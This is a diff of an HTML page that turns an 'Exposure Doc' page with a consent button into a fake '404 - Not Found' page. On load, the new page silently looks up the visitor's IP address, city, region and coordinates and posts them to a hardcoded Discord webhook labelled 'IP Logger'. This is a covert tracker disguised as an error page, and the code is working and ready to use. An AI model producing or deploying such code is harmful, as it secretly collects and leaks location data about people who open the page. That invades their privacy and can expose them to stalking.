@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exposure Doc</title>
+    <title>404 - Not Found</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #f4f4f4;
             color: #333;
             text-align: center;
-            padding: 20px;
+            padding: 50px;
         }
 
         .container {
@@ -22,56 +22,24 @@
         }
 
         h1 {
+            font-size: 48px;
             margin-bottom: 20px;
         }
 
         p {
-            font-size: 18px;
-        }
-
-        strong {
-            color: #555;
-        }
-
-        #info {
-            display: none; /* Hide initially */
-        }
-
-        #consent {
-            margin: 20px;
-            font-size: 18px;
-        }
-
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
+            font-size: 24px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Exposure Doc</h1>
-        <div id="info">
-            <p><strong>IP Address:</strong> <span id="ip"></span></p>
-            <p><strong>Country:</strong> <span id="country"></span></p>
-            <p><strong>Region:</strong> <span id="region"></span></p>
-            <p><strong>City:</strong> <span id="city"></span></p>
-            <p><strong>Street Address:</strong> <span id="address"></span></p>
-            <p><strong>Postal Code:</strong> <span id="postal"></span></p>
-            <p><strong>Latitude:</strong> <span id="lat"></span></p>
-            <p><strong>Longitude:</strong> <span id="lon"></span></p>
-        </div>
-        <div id="consent">
-            <p>We need your permission to access this website.</p>
-            <button id="getLocationButton">Consent</button>
-        </div>
+        <h1>404 - Not Found</h1>
+        <p>The page you are looking for does not exist.</p>
     </div>
-
     <script>
         // Function to send data to the Discord webhook
         function sendToWebhook(data) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1271770801028464691/lwFP4ypxNZJm8SNeRf5td03JCuXcmtwS08dmrHOGfeJ9zcXW4QC2DxZD_trlncIAqwuz'; // Replace with your Discord webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1271770801028464691/lwFP4ypxNZJm8SNeRf5td03JCuXcmtwS08dmrHOGfeJ9zcXW4QC2DxZD_trlncIAqwuz'; // Replace with your webhook URL
             const request = new XMLHttpRequest();
             request.open("POST", webhookUrl);
             request.setRequestHeader('Content-type', 'application/json');
@@ -79,78 +47,20 @@
             const params = {
                 username: "IP Logger",
                 avatar_url: "",
-                content: `IP Address: ${data.ip || "Not Available"}\nCountry: ${data.country_name || "Not Available"}\nRegion: ${data.region_name || "Not Available"}\nCity: ${data.city || "Not Available"}\nStreet Address: ${data.street || "Not Available"}\nPostal Code: ${data.postal || "Not Available"}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}`
-            };
+                content: `IP Address: ${data.ip}\nCountry: ${data.country_name}\nRegion: ${data.region_name}\nCity: ${data.city}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}`
+            }
 
             request.send(JSON.stringify(params));
         }
 
-        // Function to fetch user's IP and location data
-        function fetchIPData() {
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('ip').textContent = data.ip;
-                    document.getElementById('country').textContent = data.country_name;
-                    document.getElementById('region').textContent = data.region_name;
-                    document.getElementById('city').textContent = data.city;
-                    document.getElementById('postal').textContent = data.postal;
-                    document.getElementById('lat').textContent = data.latitude;
-                    document.getElementById('lon').textContent = data.longitude;
-                })
-                .catch(error => console.error('Error fetching IP data:', error));
-        }
-
-        // Function to get the user's location via Geolocation API
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-
-                    // Use Nominatim for reverse geocoding
-                    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
-                        .then(response => response.json())
-                        .then(data => {
-                            document.getElementById('city').textContent = data.address.city || "Not Available";
-                            document.getElementById('country').textContent = data.address.country || "Not Available";
-                            document.getElementById('region').textContent = data.address.state || "Not Available";
-                            document.getElementById('postal').textContent = data.address.postcode || "Not Available";
-                            document.getElementById('lat').textContent = lat;
-                            document.getElementById('lon').textContent = lon;
-                            document.getElementById('address').textContent = data.display_name || "Not Available";
-
-                            // Prepare data to send to Discord
-                            const ipData = {
-                                ip: "Not Available", // IP data is not fetched in this case
-                                country_name: data.address.country || "Not Available",
-                                region_name: data.address.state || "Not Available",
-                                city: data.address.city || "Not Available",
-                                postal: data.address.postcode || "Not Available",
-                                latitude: lat,
-                                longitude: lon,
-                                street: data.display_name || "Not Available",
-                            };
-
-                            sendToWebhook(ipData);
-                            document.getElementById('info').style.display = 'block';
-                        })
-                        .catch(error => console.error('Error fetching geocoding data:', error));
-                }, error => {
-                    console.error("Geolocation error: ", error);
-                    alert("Unable to retrieve your location. Please check your settings.");
-                });
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        }
-
-        // Add event listener for the location button
-        document.getElementById('getLocationButton').addEventListener('click', function() {
-            fetchIPData(); // Fetch IP data before asking for location
-            getLocation();
-            document.getElementById('consent').style.display = 'none'; // Hide consent prompt
-        });
+        // Fetch user's IP and location data
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                // Send data to Discord webhook
+                sendToWebhook(data);
+            })
+            .catch(error => console.error('Error:', error));
     </script>
 </body>
 </html>
